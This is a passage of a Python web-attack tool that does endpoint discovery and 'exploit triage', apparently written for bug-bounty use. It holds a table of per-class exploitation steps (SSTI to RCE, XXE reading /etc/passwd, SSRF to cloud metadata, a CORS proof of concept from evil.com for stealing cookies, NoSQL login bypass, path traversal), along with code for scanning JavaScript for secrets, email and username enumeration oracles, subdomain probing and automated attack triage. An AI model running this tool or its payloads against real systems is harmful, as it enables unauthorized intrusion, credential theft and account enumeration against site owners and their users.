    "SSTI": "Probe {{7*7}} {{config}} {{''.__class__}}; escalate to RCE via __mro__ → subprocess",
    "XXE": "Test file:///etc/passwd and SSRF via http://169.254.169.254/; try OOB with Burp Collaborator",
    "SSRF": "Try AWS metadata: 169.254.169.254; GCP metadata: metadata.google.internal; internal ports",
    "CORS": "Build PoC XHR from evil.com; if ACAC:true + reflected origin → steal auth cookies/tokens",
    "MASS_ASSIGN": "Add role/admin/balance fields to PUT/PATCH/POST body; check if reflected or applied",
    "OPEN_REDIRECT": "Redirect to https://evil.com; use in phishing, OAuth redirect URI abuse",
    "JWT": "Check alg:none bypass; brute secret with hashcat/jwt-cracker; try RS256→HS256 confusion",
    "OAUTH": "Test missing state param (CSRF); test open redirect in redirect_uri; try client_credentials",
    "GRAPHQL": "Run introspection; query for password/secret/ssn fields; test mutation privilege escalation",
    "HOST_HEADER": "Inject X-Forwarded-Host: evil.com; test password reset link poisoning",
    "CACHE_POISON": "Inject X-Forwarded-Host in unkeyed header; confirm with X-Cache: HIT on second request",
    "RACE_CONDITION": "Send 20+ parallel requests simultaneously; target coupon/balance/transfer endpoints",
    "NOSQL": "Send JSON operators: {\"username\":{\"$gt\":\"\"}, \"password\":{\"$gt\":\"\"}}",
    "RATE_LIMIT": "Send rapid requests; test on login/OTP/reset endpoints for brute-force potential",
    "DESERIALIZATION": "Send Java (\\xac\\xed) or Python pickle blobs; use ysoserial gadget chains",
    "BUSINESS_LOGIC": "Test negative amounts; skip payment steps; apply coupon multiple times (race); modify prices",
    "PATH_TRAVERSAL": "Try ../../etc/passwd; URL-encode: %2e%2e%2f; double-encode: %252e%252e%252f",
    "FILE_OPS": "Test file upload bypass: double extension, null byte, MIME confusion, zip slip",
}


def color_tag(t: str) -> str:
    c = TAG_COLOR.get(t, W)
    return f"{c}{t}{RST}"


def print_report(endpoints: List[Endpoint], tech: Set[str], passive_subdomains: List[str],
                 sourcemap_secrets: List[str]) -> None:
    by_tag: Dict[str, List[Endpoint]] = defaultdict(list)
    for ep in endpoints:
        for t in ep.tags:
            by_tag[t].append(ep)

    sorted_eps = sorted(endpoints, key=score, reverse=True)

    print(f"\n{BOLD}{'═'*70}{RST}")
    print(f"{BOLD}{R}  ENDPOINT DISCOVERY RESULTS{RST}")
    print(f"{BOLD}{'═'*70}{RST}\n")

    if tech:
        print(f"{B}[Technology]{RST} {', '.join(sorted(tech))}\n")

    if passive_subdomains:
        print(f"{B}[Subdomains via crt.sh]{RST}")
        for s in sorted(set(passive_subdomains))[:30]:
            print(f"  {DIM}{s}{RST}")
        print()

    if sourcemap_secrets:
        print(f"{R}[Source Map Secrets]{RST}")
        for s in sourcemap_secrets:
            print(f"  {R}★{RST} {s}")
        print()

    # Stats
    gold_count = sum(1 for ep in endpoints if ep.tags & GOLD)
    unauthed = [ep for ep in endpoints if ep.requires_auth is False]
    print(f"{W}Total endpoints discovered:{RST} {len(endpoints)}")
    print(f"{R}High-value (GOLD tags):{RST} {gold_count}")
    print(f"{R}Accessible without auth:{RST} {len(unauthed)}")
    print(f"{W}Attack classes found:{RST} {', '.join(color_tag(t) for t in sorted(by_tag.keys()))}\n")

    if unauthed:
        print(f"\n{BOLD}{R}══ ACCESSIBLE WITHOUT AUTH ══{RST}")
        for ep in sorted(unauthed, key=score, reverse=True):
            _print_endpoint(ep)

    # Print by attack class, gold first
    printed_urls: Set[str] = set()
    for tag in sorted(TAGS_ALL, key=lambda t: (0 if t in GOLD else 1 if t in SILVER else 2, t)):
        eps = [ep for ep in by_tag.get(tag, []) if ep.url not in printed_urls]
        if not eps:
            continue
        print(f"\n{BOLD}{TAG_COLOR.get(tag, W)}══ {tag} ══{RST}")
        if tag in NEXT_STEPS:
            print(f"  {DIM}How to exploit: {NEXT_STEPS[tag]}{RST}\n")
        for ep in sorted(eps, key=score, reverse=True)[:15]:
            _print_endpoint(ep)
            printed_urls.add(ep.url)

    # Remaining
    remaining = [ep for ep in sorted_eps if ep.url not in printed_urls]
    if remaining:
        print(f"\n{BOLD}{DIM}══ OTHER DISCOVERED ENDPOINTS ══{RST}")
        for ep in remaining[:30]:
            _print_endpoint(ep)

    print(f"\n{DIM}{'─'*70}{RST}\n")


def _print_endpoint(ep: Endpoint) -> None:
    status_color = G if ep.status in (200, 201) else (Y if ep.status in (301, 302, 307, 308) else (R if ep.status in (500, 502) else DIM))
    auth_indicator = f" {R}[NO AUTH]{RST}" if ep.requires_auth is False else (" {DIM}[AUTH]{RST}" if ep.requires_auth else "")
    tags_str = " ".join(color_tag(t) for t in sorted(ep.tags)) if ep.tags else ""
    methods_str = f" {DIM}[{','.join(ep.methods)}]{RST}" if ep.methods else ""
    print(f"  {status_color}{ep.status or '???'}{RST} {W}{ep.url}{RST}{auth_indicator}{methods_str}")
    if tags_str:
        print(f"       {tags_str}")
    for note in ep.notes[:4]:
        print(f"       {DIM}→ {note}{RST}")
    if ep.redirect_to:
        print(f"       {DIM}↳ {ep.redirect_to}{RST}")
    print()


# ── Output formats ────────────────────────────────────────────────────────────

def save_json(endpoints: List[Endpoint], path: str):
    data = []
    for ep in sorted(endpoints, key=score, reverse=True):
        data.append({
            "url": ep.url, "path": ep.path, "status": ep.status,
            "methods": ep.methods, "tags": sorted(ep.tags),
            "notes": ep.notes, "requires_auth": ep.requires_auth,
            "source": ep.source, "content_type": ep.content_type,
            "body_sample": ep.body_sample[:200],
            "redirect_to": ep.redirect_to, "params": ep.params,
            "score": score(ep),
        })
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"{G}JSON saved:{RST} {path}")


def save_csv(endpoints: List[Endpoint], path: str):
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["score", "url", "status", "tags", "requires_auth", "source", "notes"])
        for ep in sorted(endpoints, key=score, reverse=True):
            w.writerow([score(ep), ep.url, ep.status, "|".join(sorted(ep.tags)),
                        ep.requires_auth, ep.source, " | ".join(ep.notes[:3])])
    print(f"{G}CSV saved:{RST} {path}")


def save_markdown(endpoints: List[Endpoint], tech: Set[str], target: str, path: str):
    lines = [f"# Recon Report: {target}\n\n"]
    lines.append(f"**Date:** {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}  \n")
    lines.append(f"**Technology:** {', '.join(sorted(tech)) or 'Unknown'}  \n")
    lines.append(f"**Endpoints:** {len(endpoints)}  \n\n")
    lines.append("## High-Priority Findings\n\n")
    lines.append("| Score | Status | URL | Tags | Notes |\n")
    lines.append("|-------|--------|-----|------|-------|\n")
    for ep in sorted(endpoints, key=score, reverse=True)[:50]:
        tags = ", ".join(sorted(ep.tags))
        notes = "; ".join(ep.notes[:2])
        lines.append(f"| {score(ep)} | {ep.status} | `{ep.url}` | {tags} | {notes} |\n")
    lines.append("\n## All Endpoints\n\n")
    for ep in sorted(endpoints, key=score, reverse=True):
        lines.append(f"### `{ep.path}` ({ep.status})\n")
        if ep.tags:
            lines.append(f"**Tags:** {', '.join(sorted(ep.tags))}  \n")
        if ep.requires_auth is False:
            lines.append("**Auth required:** NO ⚠️  \n")
        for note in ep.notes:
            lines.append(f"- {note}\n")
        lines.append("\n")
    with open(path, "w") as f:
        f.writelines(lines)
    print(f"{G}Markdown saved:{RST} {path}")


# ── Main ──────────────────────────────────────────────────────────────────────

async def run(args):
    banner()
    base = args.target.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    host = extract_host(base)

    conn = aiohttp.TCPConnector(ssl=False, limit=args.concurrency + 10)
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    if args.headers:
        default_headers.update(json.loads(args.headers))
    if args.cookies:
        default_headers["Cookie"] = args.cookies

    proxy = args.proxy or None
    timeout = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(connector=conn, headers=default_headers) as session:
        sem = asyncio.Semaphore(args.concurrency)
        http = HTTP(sem, session, verbose=args.verbose, delay=args.delay)

        all_endpoints: List[Endpoint] = []
        sourcemap_secrets: List[str] = []

        # ── Phase 0: Fingerprint ──────────────────────────────────────────────
        print(f"{BOLD}{B}[Phase 0] Technology Fingerprinting{RST}")
        forced_tech = set(args.tech.split(",")) if args.tech else set()
        tech = await fingerprint(http, base)
        tech.update(forced_tech)

        # ── Phase 1: Passive recon ────────────────────────────────────────────
        passive_subdomains: List[str] = []
        if not args.no_passive:
            print(f"\n{BOLD}{B}[Phase 1] Passive Recon{RST}")
            tasks = [
                passive_wayback(http, host),
                passive_urlscan(http, host),
                passive_commoncrawl(http, host),
                passive_otx(http, host),
                passive_crtsh(http, host),
            ]
            results = await asyncio.gather(*tasks)
            wayback_urls, urlscan_urls, cc_urls, otx_urls, subdomains = results
            passive_subdomains = subdomains

            # Deduplicate and extract paths from passive URLs
            passive_paths = set()
            for url_list in [wayback_urls, urlscan_urls, cc_urls, otx_urls]:
                for u in url_list:
                    try:
                        p = urllib.parse.urlparse(u)
                        if p.hostname and host in p.hostname:
                            path = p.path.lstrip("/")
                            if path:
                                passive_paths.add(path)
                    except Exception:
                        pass
            print(f"  {G}Passive paths extracted:{RST} {len(passive_paths)}")

            # Probe passive paths
            if passive_paths:
                passive_eps = await probe_paths(http, base, list(passive_paths)[:1000])
                all_endpoints.extend(passive_eps)
                print(f"  {G}Passive endpoints found:{RST} {len(passive_eps)}")

        # ── Phase 2: Active crawl + JS scanning ──────────────────────────────
        js_urls_all: List[str] = []
        if not args.passive_only:
            print(f"\n{BOLD}{B}[Phase 2] Active Crawl + JS Secret Scan (depth={args.depth}){RST}")
            status0, html_body0, _ = await http.get(base)
            js_urls_all = await discover_js_files(http, base, html_body0 if status0 else "")

            crawl_paths, sourcemap_urls = await crawl(http, base, depth=args.depth)
            print(f"  Crawl found {len(crawl_paths)} paths, {len(sourcemap_urls)} source maps, {len(js_urls_all)} JS files")

            # Source map secrets
            for sm_url in sourcemap_urls[:10]:
                sm_paths, sm_secrets = await fetch_sourcemap(http, sm_url)
                crawl_paths.extend(sm_paths)
                sourcemap_secrets.extend(sm_secrets)
                if sm_secrets:
                    print(f"  {R}Source map secrets found:{RST} {sm_url}")

            # JS secret scanning
            js_secrets = await scan_js_secrets(http, base, js_urls_all + sourcemap_urls)
            if js_secrets:
                print(f"  {R}JS secrets found: {len(js_secrets)}{RST}")
                sourcemap_secrets.extend(js_secrets)

            crawl_eps = await probe_paths(http, base, crawl_paths)
            all_endpoints.extend(crawl_eps)
            print(f"  {G}Crawl endpoints found:{RST} {len(crawl_eps)}")

        # ── Phase 3: Wordlist + POST probe ────────────────────────────────────
        if not args.passive_only:
            print(f"\n{BOLD}{B}[Phase 3] Wordlist Probing + POST Probe{RST}")
            wordlist = build_wordlist(tech)
            print(f"  Probing {len(wordlist)} paths (GET)...")
            wl_eps = await probe_paths(http, base, wordlist)
            all_endpoints.extend(wl_eps)
            print(f"  {G}Wordlist GET endpoints:{RST} {len(wl_eps)}")

            print(f"  POST probing {min(len(wordlist), 400)} paths...")
            post_eps = await post_probe_paths(http, base, wordlist[:400])
            # Only add POST results that weren't already found via GET
            existing_urls = {ep.url for ep in all_endpoints}
            new_post = [ep for ep in post_eps if ep.url not in existing_urls]
            all_endpoints.extend(new_post)
            print(f"  {G}POST-only endpoints:{RST} {len(new_post)}")

        # ── Phase 4: Email / user oracle scan ────────────────────────────────
        if not args.no_enum:
            print(f"\n{BOLD}{B}[Phase 4] Email / User Oracle Scan{RST}")
            oracle_eps = await email_oracle_scan(http, base, all_endpoints)
            existing_urls = {ep.url for ep in all_endpoints}
            new_oracle = [ep for ep in oracle_eps if ep.url not in existing_urls]
            all_endpoints.extend(new_oracle)
            print(f"  {R if new_oracle else G}Oracle findings:{RST} {len(new_oracle)} account-enum candidates")

        # ── Phase 5: Spec parsing ─────────────────────────────────────────────
        print(f"\n{BOLD}{B}[Phase 5] Spec & Schema Parsing{RST}")
        spec_eps = await parse_openapi(http, base)
        gql_eps = await parse_graphql(http, base)
        all_endpoints.extend(spec_eps)
        all_endpoints.extend(gql_eps)

        # ── Phase 6: Live subdomain scan ──────────────────────────────────────
        sub_endpoint_count = 0
        if not args.no_passive and passive_subdomains and not args.passive_only:
            print(f"\n{BOLD}{B}[Phase 6] Live Subdomain Discovery & Scan{RST}")
            print(f"  Probing {len(passive_subdomains)} subdomains from crt.sh + {len(SUBDOMAIN_COMMON)} common names...")
            live_subs = await probe_subdomains_live(http, passive_subdomains, host)
            print(f"  {G}Live subdomains:{RST} {len(live_subs)}")
            for sub, sub_base in live_subs[:20]:
                sub_eps = await scan_subdomain(http, sub_base, tech, args)
                for ep in sub_eps:
                    all_endpoints.append(ep)
                    sub_endpoint_count += 1
            print(f"  {G}Subdomain endpoints found:{RST} {sub_endpoint_count}")

        # ── Deduplicate ───────────────────────────────────────────────────────
        seen_urls: Set[str] = set()
        unique_eps: List[Endpoint] = []
        for ep in all_endpoints:
            if ep.url not in seen_urls:
                seen_urls.add(ep.url)
                unique_eps.append(ep)
        all_endpoints = unique_eps
        print(f"\n  {G}Total unique endpoints:{RST} {len(all_endpoints)}")

        # ── Phase 7: Auth boundary ────────────────────────────────────────────
        print(f"\n{BOLD}{B}[Phase 7] Auth Boundary Mapping{RST}")
        await map_auth_boundary(http, all_endpoints)
        unauthed = sum(1 for ep in all_endpoints if ep.requires_auth is False)
        print(f"  {R}Accessible without auth:{RST} {unauthed}")

        # ── Phase 8: Exploit triage ───────────────────────────────────────────
        if not args.no_triage:
            print(f"\n{BOLD}{B}[Phase 8] Exploit Triage{RST}")

            triage_tasks = []
            for ep in all_endpoints:
                if ep.status in (200, 201, 204, 301, 302, 307, 308, 403, 405):
                    triage_tasks.append(_triage_endpoint(http, ep, args))

            await asyncio.gather(*triage_tasks)

        # ── Phase 9: Verb tampering ───────────────────────────────────────────
        if not args.no_verbs:
            print(f"\n{BOLD}{B}[Phase 9] HTTP Verb Enumeration{RST}")
            high_val = [ep for ep in all_endpoints
                        if ep.tags & {"ADMIN", "IDOR", "AUTH_BYPASS", "BUSINESS_LOGIC"}][:30]
            await asyncio.gather(*[triage_verb_tamper(http, ep) for ep in high_val])
            print(f"  Checked verbs on {len(high_val)} high-value endpoints")

        # ── Output ────────────────────────────────────────────────────────────
        print_report(all_endpoints, tech, passive_subdomains, sourcemap_secrets)

        if args.output:
            save_json(all_endpoints, args.output)
        if args.csv:
            save_csv(all_endpoints, args.csv)
        if args.md:
            save_markdown(all_endpoints, tech, base, args.md)

        return all_endpoints


# ── Subdomain live probing ────────────────────────────────────────────────────

async def probe_subdomains_live(http: HTTP, subdomains: List[str], base_host: str) -> List[Tuple[str, str]]:
    """Resolve subdomains to live HTTP targets. Returns [(subdomain, base_url)]."""
    import socket
    live: List[Tuple[str, str]] = []

    async def check_sub(sub: str):
        sub = sub.strip().lower()
        if not sub or sub == base_host:
            return
        try:
            socket.getaddrinfo(sub, 443, proto=socket.IPPROTO_TCP)
        except Exception:
            return
        for scheme, port in [("https", 443), ("http", 80), ("https", 8443), ("http", 8080)]:
            url = f"{scheme}://{sub}/"
            status, body, headers = await http.get(url)
            if status and status not in (0,):
                live.append((sub, f"{scheme}://{sub}"))
                return

    # Also try common subdomain names on the target domain
    tld = ".".join(base_host.split(".")[-2:])
    generated = [f"{prefix}.{tld}" for prefix in SUBDOMAIN_COMMON]
    all_subs = list(set(subdomains + generated))

    batch = 50
    for i in range(0, min(len(all_subs), 300), batch):
        chunk = all_subs[i:i+batch]
        await asyncio.gather(*[check_sub(s) for s in chunk], return_exceptions=True)

    return live


# ── JS secret scanning ────────────────────────────────────────────────────────

async def scan_js_secrets(http: HTTP, base: str, js_urls: List[str]) -> List[str]:
    """Fetch JS files and scan for hardcoded secrets."""
    findings: List[str] = []
    seen: Set[str] = set()

    async def scan_one(url: str):
        if url in seen:
            return
        seen.add(url)
        status, body, _ = await http.get(url)
        if status != 200 or not body:
            return
        for pattern, label in SECRET_PATTERNS:
            for m in pattern.finditer(body):
                val = m.group(0)
                if len(val) > 6:
                    findings.append(f"[{label}] in {url}: {val[:120]}")

    await asyncio.gather(*[scan_one(u) for u in js_urls[:100]], return_exceptions=True)
    return findings


async def discover_js_files(http: HTTP, base: str, html_body: str) -> List[str]:
    """Enumerate JS chunk files from webpack manifest / main bundle."""
    js_urls: List[str] = []
    base = base.rstrip("/")

    # Common main bundle paths
    candidates = [
        "static/js/main.js", "static/js/bundle.js", "static/js/app.js",
        "assets/js/app.js", "js/app.js", "js/main.js",
        "dist/bundle.js", "dist/app.js", "build/static/js/main.js",
        "runtime-main.js", "static/js/runtime-main.js",
        "_next/static/chunks/main.js",
        "webpack-manifest.json", "asset-manifest.json",
        "static/asset-manifest.json", "build/asset-manifest.json",
    ]

    # Extract from HTML
    for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', html_body):
        path = m.group(1)
        if not path.startswith("http"):
            path = f"{base}/{path.lstrip('/')}"
        js_urls.append(path)

    # Check manifest for chunk list
    for manifest_path in ["asset-manifest.json", "static/asset-manifest.json",
                          "build/asset-manifest.json", "webpack-manifest.json"]:
        status, body, _ = await http.get(f"{base}/{manifest_path}")
        if status == 200 and body:
            for m in re.finditer(r'"([^"]+\.js)"', body):
                path = m.group(1)
                if not path.startswith("http"):
                    path = f"{base}/{path.lstrip('/')}"
                js_urls.append(path)
            break

    for path in candidates:
        js_urls.append(f"{base}/{path}")

    return list(dict.fromkeys(js_urls))


# ── POST probe all discovered paths ──────────────────────────────────────────

async def post_probe_paths(http: HTTP, base: str, paths: List[str]) -> List[Endpoint]:
    """Try POST on every discovered path — many endpoints only respond to POST."""
    base = base.rstrip("/")
    found: List[Endpoint] = []
    post_payloads = [
        {"email": "test@example.com"},
        {"username": "test", "password": "test"},
        {},
    ]

    async def check_post(path: str):
        path = path.lstrip("/")
        url = f"{base}/{path}"
        for payload in post_payloads[:1]:
            status, body, headers = await http.post(
                url, json=payload,
                headers={"Content-Type": "application/json"}
            )
            if status in (200, 201, 204, 400, 422):
                ep = Endpoint(url=url, path=path, status=status,
                              methods=["POST"], source="post_probe",
                              content_type=headers.get("Content-Type", ""),
                              body_sample=body[:300],
                              response_headers=headers)
                for pat, tags in TAG_RULES:
                    if pat.search("/" + path):
                        ep.tags.update(tags)
                found.append(ep)
                return

    await asyncio.gather(*[check_post(p) for p in paths], return_exceptions=True)
    return found


# ── Email / user oracle ───────────────────────────────────────────────────────

ORACLE_VERBOSE = re.compile(
    r"(user\s+(not found|doesn.t exist|does not exist|invalid|unknown)|"
    r"account\s+(not found|doesn.t exist|does not exist)|"
    r"email\s+(not found|not registered|unknown|invalid|doesn.t exist)|"
    r"no\s+account\s+found|invalid\s+email|that\s+email|"
    r"we\s+couldn.t\s+find|we could not find|"
    r"username\s+not\s+found|incorrect\s+username|wrong\s+username|"
    r"not\s+enrolled|not\s+on\s+(?:the\s+)?waitlist|"
    r"not\s+eligible|not\s+qualified|not\s+available|"
    r"already\s+(?:on|in|enrolled|registered|signed\s+up)|"
    r"you.re\s+(?:already|on\s+the)|"
    r"position\s+\d+|you.re\s+#\d+|"
    r"reserved\s+your\s+spot|your\s+spot\s+is)",
    re.I
)

ORACLE_ENROLLED = re.compile(
    r"(eligible|enrolled|on\s+the\s+(?:list|waitlist)|"
    r"have\s+access|already\s+have|you\s+(?:have|got)|"
    r"congratulations|activated|unlocked|"
    r"gold|platinum|premium|pro\s+plan)",
    re.I
)


async def email_oracle_scan(http: HTTP, base: str, endpoints: List[Endpoint]) -> List[Endpoint]:
    """
    For endpoints accepting email/username, probe with real-looking vs nonexistent
    addresses and detect differential responses — the Robinhood waitlist pattern.
    """
    NONEXIST_EMAIL = "zzz_no_such_user_xqq_12345@fakefakedomain99.com"
    NONEXIST_USER = "_zzz_no_such_user_xqq_12345_"
    TEST_EMAILS = [
        "admin@" + extract_host(base),
        "test@" + extract_host(base),
        "support@" + extract_host(base),
        "info@" + extract_host(base),
        "noreply@" + extract_host(base),
        "admin@gmail.com",
        "test@test.com",
    ]

    # Also probe dedicated oracle path list
    oracle_candidates = list({ep.url for ep in endpoints
                               if any(k in ep.path.lower() for k in
                                      ["email", "user", "check", "exist", "waitlist",
                                       "queue", "spot", "position", "invite", "status",
                                       "register", "signup", "login", "auth"])})
    # Add wordlist oracle paths
    for path in WORDLIST_EMAIL_ORACLE_PATHS:
        oracle_candidates.append(f"{base.rstrip('/')}/{path.lstrip('/')}")
    oracle_candidates = list(dict.fromkeys(oracle_candidates))[:150]

    new_eps: List[Endpoint] = []

    async def probe_oracle(url: str):
        path = urllib.parse.urlparse(url).path.lstrip("/")
        # GET with email param
        baseline_s, baseline_b, _ = await http.get(url, params={"email": NONEXIST_EMAIL})
        if not baseline_s:
            baseline_s, baseline_b, _ = await http.post(
                url, json={"email": NONEXIST_EMAIL},
                headers={"Content-Type": "application/json"})
        if not baseline_s:
            return

        diffs_found = []
        for test_email in TEST_EMAILS[:4]:
            ts, tb, _ = await http.get(url, params={"email": test_email})
            if not ts:
                ts, tb, _ = await http.post(url, json={"email": test_email},
                                              headers={"Content-Type": "application/json"})
            if not ts:
                continue

            status_diff = ts != baseline_s
            body_diff = abs(len(tb) - len(baseline_b)) > 30
            enrolled_in_test = bool(ORACLE_ENROLLED.search(tb))
            enrolled_in_base = bool(ORACLE_ENROLLED.search(baseline_b))
            verbose_test = ORACLE_VERBOSE.search(tb)
            verbose_base = ORACLE_VERBOSE.search(baseline_b)

            if status_diff:
                diffs_found.append(f"Status oracle: {test_email} → {ts} (nonexist:{baseline_s})")
            if body_diff and (enrolled_in_test != enrolled_in_base):
                diffs_found.append(f"Body oracle: {test_email} body={len(tb)} vs nonexist={len(baseline_b)}")
            if enrolled_in_test and not enrolled_in_base:
                diffs_found.append(f"Enrollment leak: '{test_email}' triggers enrollment response")
            if verbose_test and str(verbose_test.group(0)) != str((verbose_base or "and").group(0) if verbose_base else ""):
                diffs_found.append(f"Verbose response: {verbose_test.group(0)[:60]!r}")

        if diffs_found or ORACLE_VERBOSE.search(baseline_b):
            ep = Endpoint(url=url, path=path, status=baseline_s,
                          source="email_oracle", tags={"ACCOUNT_ENUM", "INFO_DISC"})
            ep.notes.extend(diffs_found[:4])
            if not diffs_found:
                ep.notes.append(f"Verbose error on nonexistent email: {ORACLE_VERBOSE.search(baseline_b).group(0)[:60]}")
            new_eps.append(ep)

        # Also try username param
        us_s, us_b, _ = await http.get(url, params={"username": NONEXIST_USER})
        if us_s and us_s == baseline_s:
            for test_user in ["admin", "root", "test", "support"][:2]:
                ts2, tb2, _ = await http.get(url, params={"username": test_user})
                if ts2 != us_s or abs(len(tb2) - len(us_b)) > 30:
                    ep2 = Endpoint(url=url + "?username=", path=path,
                                   status=ts2, source="email_oracle",
                                   tags={"ACCOUNT_ENUM"})
                    ep2.notes.append(f"Username oracle: '{test_user}' → {ts2} body_diff={abs(len(tb2)-len(us_b))}")
                    new_eps.append(ep2)
                    break

    await asyncio.gather(*[probe_oracle(u) for u in oracle_candidates], return_exceptions=True)
    return new_eps


# ── Multi-subdomain runner ────────────────────────────────────────────────────

async def scan_subdomain(http: HTTP, sub_base: str, tech: Set[str], args) -> List[Endpoint]:
    """Run a reduced scan (wordlist + POST probe + email oracle) on a live subdomain."""
    print(f"  {C}Scanning subdomain:{RST} {sub_base}")
    eps: List[Endpoint] = []

    wordlist = build_wordlist(tech)[:300]
    wl_eps = await probe_paths(http, sub_base, wordlist)
    eps.extend(wl_eps)

    post_eps = await post_probe_paths(http, sub_base, wordlist[:200])
    eps.extend(post_eps)

    oracle_eps = await email_oracle_scan(http, sub_base, eps)
    eps.extend(oracle_eps)

    return eps


async def _triage_endpoint(http: HTTP, ep: Endpoint, args) -> None:
    tasks = [triage_cors(http, ep), triage_jwt(ep)]

    if not args.no_enum and any(k in ep.path.lower() for k in
                                 ["login", "signin", "sign-in", "auth", "token", "session"]):
        tasks.append(triage_account_enum(http, ep.url, ep))
        tasks.append(triage_rate_limit(http, ep))
        tasks.append(triage_nosql(http, ep))

    if "SSRF" in ep.tags or any(k in ep.path.lower() for k in ["fetch", "proxy", "webhook", "url", "forward"]):
        tasks.append(triage_ssrf(http, ep))

    if "OPEN_REDIRECT" in ep.tags or any(k in ep.path.lower() for k in ["redirect", "return", "next", "goto"]):
        tasks.append(triage_open_redirect(http, ep))

    if "HOST_HEADER" in ep.tags or any(k in ep.path.lower() for k in ["reset", "password", "forgot"]):
        tasks.append(triage_host_header(http, ep))

    if ep.status in (200, 201) and any(t in ep.tags for t in ["ADMIN", "IDOR", "INFO_DISC"]):
        tasks.append(triage_auth_bypass(http, ep))

    if "IDOR" in ep.tags:
        tasks.append(triage_idor(http, ep))

    if ep.status in (200, 201) and any(t in ep.tags for t in ["MASS_ASSIGN", "ADMIN"]):
        tasks.append(triage_mass_assignment(http, ep))

    if "XXE" in ep.tags or "FILE_OPS" in ep.tags:
        tasks.append(triage_xxe(http, ep))

    if "SQLI" in ep.tags or "INJECTION" in ep.tags:
        tasks.append(triage_sql_injection(http, ep))

    if ep.status in (200, 201):
        tasks.append(triage_cache_poison(http, ep))

    await asyncio.gather(*tasks, return_exceptions=True)


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="Maximum-coverage endpoint discovery & exploit triage — authorized targets only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("target", help="Target base URL (e.g. https://target.example.com)")
    ap.add_argument("-c", "--concurrency", type=int, default=40)
    ap.add_argument("-o", "--output", help="JSON output file")
    ap.add_argument("--md", help="Markdown report file")
    ap.add_argument("--csv", help="CSV output file")
    ap.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth (default 3)")
    ap.add_argument("--delay", type=int, default=0, help="Delay between requests in ms")
    ap.add_argument("--passive-only", action="store_true", help="Passive recon only (no wordlist/crawl)")
    ap.add_argument("--no-passive", action="store_true", help="Skip passive sources")
    ap.add_argument("--no-enum", action="store_true", help="Skip account enumeration")
    ap.add_argument("--no-verbs", action="store_true", help="Skip verb enumeration")
    ap.add_argument("--no-cors", action="store_true", help="Skip CORS testing")
    ap.add_argument("--no-triage", action="store_true", help="Discovery only")
    ap.add_argument("--tech", default="", help="Force technology (comma-separated: spring,laravel,django,rails,express,wordpress,drupal)")
    ap.add_argument("--cookies", default="", help="Cookies (name=value; name2=value2)")
    ap.add_argument("--headers", default="", help="Extra headers as JSON string")
    ap.add_argument("--proxy", default="", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    print(f"{Y}Target:{RST} {args.target}")
    print(f"{Y}Authorization:{RST} Running against authorized targets only (bug bounty / owned)\n")

    asyncio.run(run(args))


if __name__ == "__main__":
    main()
